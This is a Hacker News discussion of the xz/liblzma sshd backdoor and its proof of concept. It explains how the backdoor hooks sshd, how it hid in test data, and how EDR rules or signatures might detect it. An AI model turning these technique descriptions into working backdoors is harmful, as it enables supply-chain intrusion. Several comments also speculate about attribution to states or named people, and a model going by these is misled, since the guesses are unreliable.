CommitSyn 3 hours agorootparentThat would only fit \"If (!) the NSA regards ssh keys as secure >for everyone but them It doesn't matter. To understand the exact behavior and extend of the backdoor, this does matter. An end to end proof of how it works is exactly what was needed. > A way to check if servers are vulnerable is probably by querying the package manager Yes, this has been know since the initial report + later discovering what exact strings are present for the payload. https://github.com/Neo23x0/signature-base/blob/master/yara/b... > Not very sophisticated, but it'll work. Unfortunately, we live in a world with closed-servers and appliances - being able as a customer or pen tester rule out certain class of security issues without having the source/insights available is usually desirable. reply nindalf 16 hours agorootparent> we live in a world with closed-servers and appliances Yeah but these servers and appliances aren't running Debian unstable are they? I'd understand if it affected LTS versions of distros, but these were people living on the bleeding edge anyway. Folks managing such servers are going to be fine running `apt-get update`. We got lucky with this one, tbh. reply doakes 16 hours agorootparentprevAre you saying POCs are pointless unless a script kiddie can use it? reply nindalf 16 hours agorootparentThe context of the conversation, which you seem to have missed, is that now that we have a POC, we need a way to check for vulnerable servers. The link being that a POC makes it easier for script kiddies to use it, meaning we're in a race against them. But we aren't, because only one group in the whole world can use this exploit. reply miduil 15 hours agorootparent> is that now that we have a POC, we need a way to check for vulnerable servers. You misunderstand me, the \"need to check for vulnerable servers\" has nothing to do with the PoC in itself. You want to know whether you're vulnerable against this mysterious unknown attacker that went through the all the hoops for a sophisticated supply chain attack. I never said that we need a way to detect it because there is a POC out, at least I didn't meant to imply that either. > script kiddies to use it, meaning we're in a race against them This is something you and the other person were suddenly coming up with, never said this in first place. reply misswaterfairy 11 hours agorootparentprevCould the provided honeypot print out keys used in successful and unsuccessful attempts? reply cjbprime 17 hours agoparentprevProbing for vulnerable deployments over the network (without the attacker's private key) seems impossible, not non-trivial. The best one could do is more micro-benchmarking, but for an arbitrary Internet host you aren't going to know whether it's slow because it's vulnerable, or because it's far away, or because the computer's slow in general -- you don't have access to how long connection attempts to that host took historically. (And of course, there are also routing fluctuations.) reply anonymous-panda 12 hours agorootparentShould be able to do it by having the scanner take multiple samples. As long as you don’t need a valid login and the performance issue is still observable, you should be about to scan for it with minimal cost reply cjbprime 4 hours agorootparentLooks like the slowdown is actually at sshd process startup time, not authentication time. So it's back to being completely impossible to network-probe for. reply acdha 17 hours agoprevHas anyone tried the PoC against one of the anomalous process behavior tools? (Carbon Black, AWS GuardDuty, SysDig, etc.) I’m curious how likely it is that someone would have noticed relatively quickly had this rolled forward and this seems like a perfect test case for that product category. reply dogman144 13 hours agoparentDepends how closely the exploit mirrors and/or masks itself within normal compression behavior imo. I don’t think GuardDuty would catch it as it doesn’t look at processes like an EDR does (CrowdStrike, Carbon black), I don’t think sysdig would catch it as looks at containers and cloud infra. Handwaving some complexity here, as GD and sysdig could prob catch something odd via privileges gained and follow-on efforts by the threat actor via this exploit. So imo means only EDRs (monitoring processes on endpoints) or software supply chain evaluations (monitoring sec problems in upstream FOSS) are most likely to catch the exploit itself. Leads into another fairly large security theme interestingly - dev teams can dislike putting EDRs on boxes bc of the hit on compute and UX issues if a containment happens, and can dislike limits policy and limits around FOSS use. So this exploit hits at the heart of a org-driven “vulnerability” that has a lot of logic to stay exposed to or to fix, depending on where you sit. Security industry’s problem set in a nutshell. reply acdha 12 hours agorootparentGuard Duty does have some ptocees level monitoring with some recent additions: https://aws.amazon.com/blogs/aws/amazon-guardduty-ec2-runtim... The main thing I was thinking is that the audit hooking and especially runtime patching across modules (liblzma5 patching functions in the main sshd code block) seems like the kind of thing a generic behavioral profile could get but especially one driven by the fact that sshd does not do any of that normally. And, yes, performance and reliability issues are a big problem here. When CarbonBlack takes down production again, you probably end up with a bunch of exclusions which mean an actual attacker might be missed. reply knoxa2511 16 hours agoparentprevSysdig released a blog on friday. \"For runtime detection, one way to go about it is to watch for the loading of the malicious library by SSHD. These shared libraries often include the version in their filename.\" The blog has the actual rule content which I haven't seen from other security vendors https://sysdig.com/blog/cve-2024-3094-detecting-the-sshd-bac... reply RamRodification 14 hours agorootparentThat relies on knowing what to look for. I.e. \"the malicious library\". The question is whether any of these solutions could catch it without knowing about it beforehand and having a detection rule specifically made for it. reply acdha 15 hours agorootparentprevThanks! That’s a little disappointing since I would have thought that the way it hooked those functions could’ve been caught by a generic heuristic but perhaps that’s more common than I thought. reply acid__ 9 hours agorootparentMy experience from working in the security space is that all the tech is pretty un-sexy (with very good sales pitches), and none of it will save you from a nation-state attacker. reply faxmeyourcode 16 hours agoprevEdit: I misunderstood what I was reading in the link below, my original comment is here for posterity. :) > From down in the same mail thread: it looks like the individual who committed the backdoor has made some recent contributions to the kernel as well... Ouch. https://www.openwall.com/lists/oss-security/2024/03/29/10 The OP is such great analysis, I love reading this kind of stuff! reply ibotty 15 hours agoparentNo that patch series is from Lasse. He said himself that it's not urgent in any way and it won't be merged this merge window, but nobody (sane) is accusing Lasse of being the bad actor. reply davikr 15 hours agoparentprevLasse Collin is not Jia Tan until proven otherwise. reply verytrivial 21 minutes agorootparentSpeaking only hypothetically, but two points: 1) No-one has been is proven to \"be\" anyone in this case. Reputation is OSS is built upon behaviour only, not identity. \"Jia Tan\" managed to tip the scales by also being helpful. That identity is 99% likely to be a confection. 2) People can do terrible things when strongly encouraged or worse coerced. Including dissolving identity boundaries. The first problem can be 'solved' by using real identities and web of trust but that will NEVER fly in OSS for a multitude of technical and social reasons. The second problem will simply never be solved in any context, OSS or otherwise. Bad actors be bad, yo. reply pavon 9 hours agorootparentprevNo, he likely is not. But the patch series includes commits co-developed by Jia Tan, and lists Jia Tan as a maintainer of the kernel module. reply robocat 12 hours agorootparentprevPassive aggressive accusation. This style of fake doubt is really not appropriate anywhere. reply Denvercoder9 15 hours agoparentprevThe referenced patch series had not made it into the kernel yet. reply wezdog1 9 hours agoparentprevAlso it may br a coincidence but JiaT75 looks a lot like Transponder 7500 which in aviation means hijacked... reply dxthrwy856 4 hours agoprevThe parallels in this one to the audacity event a couple years back are ridiculous. Cookie guy claimed that he got stabbed and that the federal police was involved in the case, which kind of hints that the events were connected to much bigger actors than just 4chan. At the time a lot of people thought its just Muse Group that's involved, but maybe it was a (Russian) state actor? Because before that he claimed that audacity had lots of telemetry/backdoors which were the reason he forked and removed in his first commits. Maybe audacity is backdoored after all? Have to check the audacity source code now. reply cookiengineer 3 hours agoparentCareful, APT28 is pretty dangerous. They are merging their ops with APT29 these days, and I wouldn't wake the cozy bear if I were you. reply CommitSyn 3 hours agoparentprevCookie guy? reply MuffinFlavored 16 hours agoprevInstead of needing the honeypot openssh.patch at compile-time https://github.com/amlweems/xzbot/blob/main/openssh.patch How did the exploit do this at runtime? I know the chain was: opensshd -> systemd for notifications -> xz included as transient dependency How did liblzma.so.5.6.1 hook/patch all the way back to openssh_RSA_verify when it was loaded into memory? reply tadfisher 16 hours agoparentWhen loading liblzma, it patches the ELF GOT (global offset table) with the address of the malicious code. In case it's loaded before libcrypto, it registers a symbol audit handler (a glibc-specific feature, IIUC) to get notified when libcrypto's symbols are resolved so it can defer patching the GOT. reply MuffinFlavored 15 hours agorootparent> When loading liblzma, it patches the ELF GOT (global offset table) with the address of the malicious code. How was this part obfuscated/undetected? reply bewaretheirs 15 hours agorootparentit was part of the binary malware payload hidden in a binary blob of \"test data\". In a compression/decompression test suite, a subtly broken allegedly compressed binary blob is not out of place. This suggests we need to audit information flow during builds - the shipping production binary package should be reproduceably buildable without reading test data or test code. reply MuffinFlavored 15 hours agorootparentHow/why did the test data get bundled into the final library output? reply acdha 15 hours agorootparentThat’s what the compromised build stage did. It’s really interesting to read if you want to see the details of how a sophisticated attacker works: https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b... https://gynvael.coldwind.pl/?lang=en&id=782 reply MuffinFlavored 14 hours agorootparent> build-to-host.m4 I wasn't aware that the rogue maintainer was able to commit himself without any PR review (or he snuck it through PR review) rogue steps in the build process as well that went unnoticed so that he could bundle decompressed `xz` streams from test data, that also patched output .so files well enough to add hooking code to them. How many \"process failures\" are described in that process that exist in every OSS repo with volunteer unknown untrusted maintainers? reply belthesar 13 hours agorootparentThat's kind of the rub here. > volunteer That's the majority of OSS. Only a handful of the projects we use today as a part of the core set of systems in the OSS world actually have corporate sponsorship by virtue of maintainers/contributors on the payroll. > unknown The actor built up a positive reputation by assisting with maintaining the repo at a time when the lead dev was unable to take an active role. In this sense, although we did not have some kind of full chain of authentication that \"Jia Tan\" was a real human that existed, that's about as good as it gets, and there's plenty of real world examples of espionage in both the open and closed source software world that can tell us that identity verification may not have prevented anything. > untrusted The actor gained trust. The barrier to gaining trust may have been low due to the mental health of the lead maintainer, but trust was earned and received. The lead maintainer communicated to distros that they should be added. That's the rub here. It's _really easy_ to say this is a process problem. It's not. This was a social engineering attack first and foremost before anything else. It unlocked the way forward for the threat actor to take many actions unilaterally. reply Aloisius 10 hours agorootparentprevThe changes to build-to-host.m4 weren't in the source repo, so there was no commit. The attacker had permissions to create GitHub releases, so they simply added it to the GitHub release tarball. reply acdha 12 hours agorootparentprevThis guy was pretty trusted after a couple of years of working on the project so I think it’s a category error to say process improvements could have fixed it. The use of autoconf detritus was a canny move since I’d bet long odds that even if your process said three other people had to review every commit they would have skimmed right over that to the ”important” changes. reply bawolff 13 hours agorootparentprev> How many \"process failures\" are described in that process that exist in every OSS repo with volunteer unknown untrusted maintainers? What process failures actually happened here? What changes in process do you think would have stopped this? reply matthew-wegner 15 hours agorootparentprev\"xz/liblzma: Bash-stage Obfuscation Explained\" covers it well https://gynvael.coldwind.pl/?lang=en&id=782 reply jeffrallen 16 hours agoparentprevifunc reply mrob 16 hours agoprevDo we know if this exploit only did something if a SSH connection was made? There's a list of strings from it on Github that includes \"DISPLAY\" and \"WAYLAND_DISPLAY\": https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01 These don't have any obvious connection to SSH, so maybe it did things even if there was no connection. This could be important to people who ran the code but never exposed their SSH server to the Internet, which some people seem to be assuming was safe. reply rdtsc 16 hours agoparentThose are probably kill switches to prevent the exploit from working if there is a terminal open or runs in a GUI session. In other words someone trying to detect, reproduce or debug it. reply cma 16 hours agoparentprevCould that be related x11 session forwarding (common security hole on the connectors' side if they don't turn it off when connecting to an untrusted machine). reply herpderperator 16 hours agoprev> Note: successful exploitation does not generate any log entries. Does this mean, had this exploit gone unnoticed, the attacker could have executed arbitrary commands as root without even a single sshd log entry on the compromised host regarding the 'connection'? reply sureglymop 16 hours agoparentYes.. The RCE happens at the connection stage before anything is logged. reply udev4096 15 hours agorootparentThat's insane. How exactly does this happen? Are there no EDR/IDS who can detect an RCE at the connection stage? reply gus_ 48 minutes agorootparentAn EDR would have detected an inbound connection to port 22. Then it'd have detected the attacker's activity (opened files, executed commands, etc) If the EDR is capable of intercepting the forks, clone() execves, open(), etc, then you can follow the traces. If it's able to deny certain activity based on rules like modifying /etc/ld.so.preload or download files with curl/wget, it'd have made the attacker's life a bit more difficult. If the attacker loaded a rootkit, then probably you'd have lost visibility of what the attacker did after that. Also not all the EDRs hook all the functions, or they have bugs, so many times you are not able to follow a trace (without pain/guessing). This telemetry usually is sent to a remote server, so the attacker could not have deleted it. reply bawolff 13 hours agorootparentprevAn IDS may detect something depending on what it is looking for. The grandparent is saying that sshd doesn't log anything. Which is not that surprising since sshd is atracker controlled. reply gitfan86 16 hours agoparentprevYeah, but then you would have ssh traffic without a matching login. Wonder if any anomaly detection would work on that reply skykooler 8 hours agorootparentThat would look the same as a random failed ssh login, which happens all the time. The connection isn't maintained past that point (unless the payload chooses to do so). reply FergusArgyll 15 hours agorootparentprevInteresting... Though you can edit whatever log file you want reply jmb99 13 hours agorootparentAny log that root on that box has write access to. It’s theoretically possible to have an anomaly detection service running on a vulnerable machine dumping all of its’ data to an append-only service on some other non-compromised box. In that case, (in this ideal world) the attacker would not be able to disable the detection service before it had logged the anomalous traffic, and wouldn’t be able to purge those logs since they were on another machine. I’m not aware of any services that a) work like this, or b) would be able to detect this class of attack earlier than last week. If someone does though, please share. reply fubar9463 12 hours agorootparentYou would be sending logs to a log collector (a SIEM) in security terms, and then you could join your firewall logs against your SSH auth logs. This kind of anomaly detection is possible. Not sure how common it is. I doubt it is common. reply fubar9463 11 hours agorootparentIn any case the ROI for correlating SSH logs against network traffic is potentially error prone and may be more noisy than useful (can you differentiate in logs between SSH logins from a private IP and a public one?). An EDR tool would be much better to look for an attacker’s next steps. But if you’re trying to catch a nation state they probably already have a plan for hiding their tracks. reply juitpykyk 11 hours agorootparentprevYou can do it on a single machine if you use the TPM to create log hashes which can't be rolled back. reply heeen2 7 hours agoprevI wonder if separating the test files out into their own repo, so that they would not have been available at build time could have made this harder. The reasoning being that anything available and this potentially involved in the build should be human readable. reply Zuiii 6 hours agoparent> Anything available and this potentially involved in the build should be human readable. That's actually a good principle to adopt overall. We should treat this attack like an air plane accident and adopt new rules that mitigate the chances of it being successfully carried out again. We might not be able to vet every single person who contributes, but we should be able to easily separate out noisy test data. reply EasyMark 3 hours agoprevThis whole thing makes me wonder if AI could detect \"anomalies\" like the human who found the actual hack did. Observe a system (lots of systems) and use that data to spot anomylous behavior from \"new\" versions of packages being added, throw up a red flag that is like \"this really doesn't act like it did in the past because parameter(s) are unusual given previous versions\" reply pixelfarmer 3 hours agoparentJust needs a fine grained enough set of parameters that are observed on a system, aka \"monitoring\", and flag anything that sticks out. No need for \"AI\" unless the parameters that are monitored have more of a (complex) pattern to them than some value +/- deviation or similar things. \"AI\" is, in an abstract way, a pattern matcher and replacer, but also a big cannon that is often not needed and simpler heuristics work faster and better (and are usually deterministic). reply lpapez 2 hours agoparentprevAnomaly, fraud, outlier detection... AI has been trying to solve that for several decades and in my experience in production these systems usually end up being a set of expert written rules saying \"if X is greater than Y, notify someone to check\". reply gghffguhvc 16 hours agoprevIs there anything actually illegal here? Like is it a plausible “business” model for talented and morally compromised developers to do this and then sell the private key to state actors without actually breaking in themselves or allowing anyone else to break in. Edit: MIT license provides a pretty broad disclaimer to say it isn’t fit for any purpose implied or otherwise. reply jcranmer 13 hours agoparentThere are things you can't contractually wave away, especially in form contracts that the other side has no ability to negotiate (which is what software licenses amount to). One of those things is going to be fraud: if the maintainer is intentionally installing backdoors into their software and not telling the user, there's going to be some fraud-like statute that they'll be liable for. reply dannyw 11 hours agorootparentThat said, if you’re doing this for your jurisdiction’s security agency, you’ll certainly be protected. reply kstrauser 16 hours agoparentprevYes. This would surely be prosecutable under the CFAA. Honestly, if I were involved in this, I'd hope that it was, say, the FBI that caught me. I think that'd be the best chance of staying out of the Guantanamo Bay Hilton, laws be damned. reply shp0ngle 13 hours agorootparentCIA didn't put anyone new into gitmo for years. The 30 remaining gitmo prisoners are all W Bush holdovers that all subsequent administrations forgot. reply aftbit 12 hours agorootparentSure but that's because the world knows about Gitmo now. What about the other quieter black sites? reply kstrauser 12 hours agorootparentprevConspiracy theorist: That's what they want you to believe. And in fairness, the whole nature of their secrecy means there's no way to know for sure. It might be just a boogeyman kept around as a useful tool for scaring people into not breaking national security-level laws. I mean, it's not as though I want to go around hacking the planet, but the idea of ending up at a CIA \"black site\", assuming such things even exist, would be enough to keep me from trying it. reply gghffguhvc 15 hours agorootparentprevEven with the MIT disclaimer and the author not being the distributor or have any relationship with the distributor. Publishing vulnerable open source software to GitHub with a disclaimer that says it isn’t fit for any purpose seems like a bit of an oversight of using MIT license in distros to me. reply bawolff 13 hours agorootparentThat is not how disclaimers work. You cannot disclaim liability for intentionally harming someone. You also cannot avoid criminal charges for a crime simply by shouting \"don't blame me\" reply gghffguhvc 3 hours agorootparentI did setup the question in a way that the developer doesn’t harm someone themselves but sells it to a state actor. I.e extremely similar outcome to finding a zero day and selling it to a state actor except it is “more” secure - need private key. The point about MIT is that they are saying to the world when publishing “as is” folks. Not claiming I haven’t backdoored it for Uncle Sam.in fact I’m not claiming anything, use at your own risk. It used to be the law to implicitly do this by weak encryption for exports. reply kstrauser 12 hours agorootparentprevThat's exactly right. Imagine a license that said \"...and I can come to your house and kill you if I want to.\" Even if someone signed it in ink and mailed a copy back, the licensor still can't go to their house and kill them even though the agreement says they can. I can imagine the case of maybe a \"King of the Hill\"-type game played on bare hardware, where you're actively trying to hack into and destroy other players' systems. Such a thing might have a license saying \"you agree we may wipe your drive after downloading all your data\", and that might be acceptable in that specific situation. You knew you were signing up for a risking endeavor that might harm your system. If/when it happens, you'd have a hard time complaining about it doing the thing it advertised that it would do. Maybe. Get a jury involved and who knows? But somewhere between those 2 examples is the xz case. There's no way a user of xz could think that it was designed to hack their system, and no amount of licensing can just wave that away. For a real world analogy, if you go skydiving, and you sign an injury against waiver, and you get hurt out of pure dumb luck and not negligence, good luck suing anyone for that. You jumped out of a plane. What did you think might happen? But if you walk into a McDonald's and fall through the floor into a basement and break your leg, no number of \"not responsible for accidents\" signs on the walls would keep them from being liable. reply bawolff 12 hours agorootparent> For a real world analogy, if you go skydiving, and you sign an injury against waiver, and you get hurt out of pure dumb luck and not negligence, good luck suing anyone for that. You jumped out of a plane. What did you think might happen? But if you walk into a McDonald's and fall through the floor into a basement and break your leg, no number of \"not responsible for accidents\" signs on the walls would keep them from being liable. Even this is a bad example, since it is just gross negligence and not intentional. A better analogy would be if mcdonalds shoots you. reply kstrauser 11 hours agorootparentI use to go to the In-N-Out in Oakland that just closed. That was a possibility, believe me. reply seattle_spring 4 hours agorootparentprevThere's a great South Park episode about this, titled \"Human CentiPad.\" Not for the squeamish. reply gghffguhvc 15 hours agorootparentprevTHE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. reply gowld 13 hours agorootparentprevA software license has never been a protection against malicious criminal activity. They'd have to prove that the \"feature\" had a legitimate non-nefarious purpose, or was accidental, neither of which apply here. reply pama 11 hours agoparentprevYou are talking about the greatest exposed hack of the computer supply chain so far by a big margin. Laws can be made retroactively for this type of thing. It has implications that are beyond the legal system, as the threat level is way beyond what is typically required as a sniff test for justifying military actions. This was not an RCE based on identifying negligent code; this was a carefully designed trap that could reverse the power dynamics during military conflict. reply greyface- 11 hours agorootparent> Laws can be made retroactively Not in the United States. https://constitution.congress.gov/browse/article-1/section-9... reply KeplerBoy 10 hours agorootparentMeh, these are potentially the kind of crimes where laws don't apply. reply alfanick 16 hours agoparentprevLegality things, depends on jurisdiction, which may or may not depend on: * where were the authors of the code, * where the code is stored, * who is attacked, * where are their servers, * who is attacking, * where are they based, * where did they attack from, * ... IANAL but it seems very complicated from law perspective (we, humanity, don't have a global law) Edit2: making a bullet point list is hard reply db48x 6 hours agoparentprevI’m no lawyer, but it is at minimum tortuous interference. reply vikramkr 2 hours agoparentprevAs a sanity check, attempted crime is still crime, so not a lawyer but part B isn't exactly ambiguous here: https://www.law.cornell.edu/uscode/text/18/1030 In terms of a plausible business model - I mean that's conspiracy to commit crime, like of course that's illegal? And depending on the state actor and the target system - literally treason if it's a cyber attack as a part of a war? You can put whatever you want into a license or contract but obviously that doesn't let you override the actual law reply vikramkr 8 hours agoparentprevIs there some weird loophole or something I'm missing here? Otherwise, I'm not exactly sure how hacking wouldn't be illegal. reply greyface- 7 hours agorootparentHacking statues cover unauthorized access, and there's no evidence that unauthorized access has occurred, unless we see someone actually making use of the backdoor in the wild. Accessing a system without authorization is a crime, but distributing code that contains a backdoor is not a crime. The attacker was authorized to publish changes to xz. reply vikramkr 3 hours agorootparentDo you have a source for the claim that this isn't a crime because it didn't succeed? As a sanity check, checking the plain text of the CFAA, it covers attempted hacking as you'd expect. So distributing a system with a backdoor, introducing a backdoor, etc all seem quite comfortably covered by existing statues. Which makes sense since like, I don't want to say 'duh' because I think that probably wouldn't meet HN guidelines for discourse but I'm not sure what else to say. Even American politicians, as notoriously incompetent as our leaders can be sometimes, wouldn't miss a crime that obvious. https://www.law.cornell.edu/uscode/text/18/1030 reply greyface- 1 hour agorootparentI'm not claiming the attempt didn't succeed. I'm claiming that the attempt didn't occur, and that distributing the backdoor more widely would only have created the preconditions for an attempt. We don't know who the intended target was, or what the intended payload was. Yes, subsection (b) of the CFAA covers attempts at acts described in subsection (a) of the CFAA. Which specific act under subsection (a) do you claim has been attempted? reply greyface- 13 hours agoparentprevI brought this up in an earlier thread and got heavily downvoted. https://news.ycombinator.com/item?id=39878227 reply cgh 6 hours agoprevComment I saw on Ars: >Interestingly enough, \"Jia Tan\" is very close to 加蛋 in Mandarin, meaning \"to add an egg\". Unlikely to be a real name or a coincidence. reply picture 5 hours agoparentJia Tan could mean literally anything as pinyin since it doesn't have diacritics for tone. 嘉坛 (Jiā tán) could be a totally plausible name, and so could 佳檀 (also Jiā tán). Chinese names can largely use any character that doesn't come with a really bad meaning reply AnotherGoodName 4 hours agorootparentYeah a quick Google brings up lots of real Jia Tans who clearly aren't behind this and hopefully aren't being wrongly accused here. But it is clearly a real and common name. reply shp0ngle 4 hours agorootparentAs other poster said, Chinese has diacritics that got usually removed when put into English websites reply shp0ngle 4 hours agoparentprevThere are many real Jia Tans on LinkedIn reply declan_roberts 15 hours agoprevOne thing I notice about state-level espionage and backdoors. The USA seems to have an affinity for hardware interdiction as opposed to software backdoors. Hardware backdoors make sense since much of it passes through the USA. Other countries such as Israel are playing the long-con with very well engineered, multi-year software backdoors. A much harder game to play. reply croemer 10 hours agoparentJia Tan's GitHub activity was mostly 10-18@UTC, consistent with Europe/Israel/Russia reply jeroenhd 9 hours agorootparentIt's rather trivial to fake git commits. Basing this stuff on email times (especially replies to emails sent that same day) would be more relevant. However. if this operation was pulled off with the precision and opsec that it seems to have been, I wouldn't be too surprised if whatever group is behind this attack would've sent over + funded a developer somewhere in a time zone of their choice. No doubt any nation state is able to station someone in Russia/Israel/one of the n-eyes countries. I doubt OSINT will figure out who is really behind this, but I'm sure governments will, soon enough. Whether or not they report the truth of their findings, and if one should trust the official reporting, is yet another tough question. reply db48x 5 hours agorootparentThe git timestamps in the git commits probably were faked, but they implicate China. There were a handful of apparent slippups though, and if we take those timestamps to be correct then it looks like they were in eastern Europe (or possibly Finland, the Baltics, or the Mediterranean coast all the way down to Egypt). And if we instead assume that these timestamps are a second–level misdirection then there is a huge complexity penalty; my money is on the simpler answer (but not all my money; it’s not a sure bet). reply Culonavirus 9 hours agorootparentprevI like to think that the performance issue in the exploit was actually an exploit of an exploit, a counterintelligence act, by some \"good samaritan\" :D reply klabb3 5 hours agorootparentprevThanks, i was wondering about this since day 0 and was too lazy to look it up. Yes it can be spoofed, but I imagine a good chunk of day-to-day is work is semi-interactive, which would make it preferable to have the attacker be in the same tz as the victims. Anyone know what tz Lasse was at? If not (eg he’s in the US), then I’d say Occam’s razor that the attacker is working those UTC 10-18 office hours without extra steps. Tz proves nothing and for a 3y low-intensity operation I’d just assume the attacker won’t introduce that much friction only to mislead. I’m sure there are much stronger signals in the investigation work that’s going on now. Unfortunately, given the hush-hush-by-default nature of our beloved intel agencies, we’ll probably never know. reply bawolff 13 hours agoparentprev> Other countries such as Israel are playing the long-con with very well engineered, multi-year software backdoors What is this in reference to? reply Voultapher 13 hours agorootparentNSO Group They are an Israel based company, that sell zero-click RCEs for phones and more. Such malicious software was involved in the murder of journalist Jamal Khashoggi. Their exploits, developed in-house as well as presumably partially bought on the black market, are some of the most sophisticated exploits found in the wild, e.g. https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-i... > JBIG2 doesn't have scripting capabilities, but when combined with a vulnerability, it does have the ability to emulate circuits of arbitrary logic gates operating on arbitrary memory. So why not just use that to build your own computer architecture and script that!? That's exactly what this exploit does. Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It's not as fast as Javascript, but it's fundamentally computationally equivalent. reply bawolff 12 hours agorootparent> that sell zero-click RCEs Exactly my point. They do not sell backdoors. Don't get me wrong, still icky, but definitely not a \"very well engineered, multi-year software backdoors\" reply db48x 5 hours agorootparentI’m not sure why you’re making that point; the exploit we are talking about _is_ an RCE. reply bawolff 5 hours agorootparentThe person i was replying to claimed that countries like usa rely on hardware modification while countries like israel rely on back-doors. This does not seem to be the case. Israel doesn't (or at least hasn't been caught) making backdoors, while the usa actually has (e.g. Dual_EG). RCE is a broad category and includes many things. That said, while technically the liblzma thing is an RCE, supply chain attacks aren't really what most people mean when they talk about an RCE vulnerability. reply xvector 12 hours agorootparentprevThey implant backdoors and sell zero-click RCEs that exploit those backdoors. reply bawolff 9 hours agorootparentThat's a pretty strong claim. Do you have any evidence they have done this? And i mean, i'm genuinely curious. I don't think they would be above doing so if they had the opportunity, i just haven't heard of any instances where they were caught doing so. reply hammock 13 hours agorootparentprevBob Maxwell (Ghislaine's father) sold backdoored software to corporations and governments all around the world, including US targets, on behalf of Israel's Mossad. \"The Maxwell-Mossad team steals spy software PROMIS from the United States, Mossad puts an undetectable trap door in it so Mossad can track the activities of anyone using it, then Maxwell sells it around the world (including back to the U.S. -- with the trap door).\" https://kclibrary.bibliocommons.com/v2/record/S120C257904 reply ginko 13 hours agorootparentprevProbably Stuxnet. reply bawolff 12 hours agorootparentStuxnet was not a backdoor. reply markus92 13 hours agorootparentprevStuxnet? reply wolverine876 15 hours agoparentprev> The USA seems to have an affinity for hardware interdiction as opposed to software backdoors. What are some examples? reply AlexCoventry 15 hours agorootparenthttps://en.wikipedia.org/wiki/Tailored_Access_Operations reply acid__ 11 hours agorootparentBe sure to check out the mentioned catalog. [1] The NSA's capabilities back in 2008 were pretty astonishing: \"RAGEMASTER\" A $30 device that taps a VGA cable and transmits the contents of your screen to the NSA van sitting outside! Crazy stuff. Makes you wonder what they've built in the last 15 years. [1] https://en.wikipedia.org/wiki/ANT_catalog reply masklinn 4 hours agorootparentToday you’ve got open access USB cable which can stream your shit out on WiFi, no doubt the NSA has worse. reply nick238 15 hours agorootparentprevThe Clipper chip? Not sure if that's what they had in mind. Nowadays it's maybe just how the NSA has rooms attached to backbone providers like https://theintercept.com/2018/06/25/att-internet-nsa-spy-hub... reply greggsy 12 hours agoparentprevI mean, they’re just the high profile ones. China makes and ships a lot of hardware, and the US makes and ships a lot of software. reply gowld 13 hours agoparentprevThis goes back to WWII. USA solves problems with manufacturing and money. Europeans relatively lack both, so they solve problems with their brains. reply hybridtupel 13 hours agorootparentIsrael is not in Europe reply Alezz 12 hours agorootparentThe perfect definition of Europe is if they took part in the Eurovision Song Contest. reply nmat 12 hours agorootparentAustralia participates in the Eurovision Song Contest. reply willsmith72 10 hours agorootparentand now i get to identify as european in heated internet debates reply fpgaminer 12 hours agoparentprevMy completely unexpert opinion, informed by listening to all the episodes of Darknet Diaries, agrees with this. US intelligence likes to just bully/bribe/blackmail the supply chain. They've got crypto chops, but I don't recall any terribly sophisticated implants like this one (except Stuxnet, which was likely Israel's work funded/assisted by the US). NK isn't terribly sophisticated, and their goal is money, so that doesn't match either. Russia is all over the place in terms of targets/sophistication/etc because of their laws (AFAIK it's legal for any citizen to wage cyberwarfare on anything and everything except domestically), but this feels a bit beyond anything I recall them accomplishing at a state level. Israeli organizations have a long history of highly sophisticated cyberwarfare (Stuxnet, NSO group, etc), and they're good about protecting their access to exploits. That seems to fit the best. That said, saying \"Israeli organization\" casts a wide net since it's such a boiling hotspot for cybersecurity professionals. Could be the work of the government, could be co-sponsored by the US, or could just be a group of smart people building another NSO group. reply formerly_proven 11 hours agorootparent> Russia is all over the place in terms of targets/sophistication/etc ... but this feels a bit beyond anything I recall them accomplishing at a state level. https://en.wikipedia.org/wiki/Triton_(malware) (https://www.justice.gov/opa/pr/four-russian-government-emplo...) reply aborsy 14 hours agoprevWhy ED448? It’s almost never recommended, in favor of curve 25519. reply throitallaway 14 hours agoparentAs I understand it Ed448 was only recently added to openssh, so maybe it was chosen in order to evade detection by analysis tools that scan for keys (if such a thing is possible.) reply juitpykyk 11 hours agorootparentSome tools scan for crypto algorithms, typically by searching for the magic numbers, Ed448 is so new many tools probably don't recognize it. Malware authors frequently change the crypto magic numbers to prevent detection. reply stock_toaster 14 hours agoparentprevI believe ed25519 offers 128 bits of security, while ed448 offers 224 bits of security. ed448 has larger key sizes too, which does seem like an odd choice in this case. Maybe it was chosen for obscurity sake (being less commonly used)? reply wolverine876 15 hours agoprevHave the heads of the targeted projects - including xz (Lasse Collin?), OpenSSH (Theo?), and Linux (Linus) - commented on it? I'm especially interested in how such exploits can be prevented in the future. reply strunz 14 hours agoparenthttps://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...: >Lasse regularly has internet breaks and is on one at the moment, started before this all kicked off. He has posted an update at https://tukaani.org/xz-backdoor/ and is working with the community. reply gowld 13 hours agoparentprevOpenSSH and Linux were not targeted/affected. xz and the Debian distribtion of OpenSSH were targeted. reply pama 12 hours agorootparentThe core source of the vulnerability (symbol lookup order allowing a dependency to preempt a function) might theoretically be fixed at the Linux+OpenSSH level. reply wolverine876 11 hours agorootparentIt's in their ecosystem; they should be concerned about other similar attacks and about addressing the fears of many users, developers, etc. reply formerly_proven 11 hours agorootparentprevDamien Miller (OpenSSH maintainer, OpenBSD committer) has written a patch that implements the relevant libsystemd functionality without libsystemd: https://bugzilla.mindrot.org/show_bug.cgi?id=2641#c13 reply cpach 12 hours agorootparentprevFedora too. reply arnaudsm 17 hours agoprevHave we seen exploitation in the wild yet? reply winkelmann 17 hours agoparentI assume the operation has most likely been called off. Their goal was probably to wait until it got into stable distros. I doubt there is a large number of unstable Debian or Fedora Rawhide 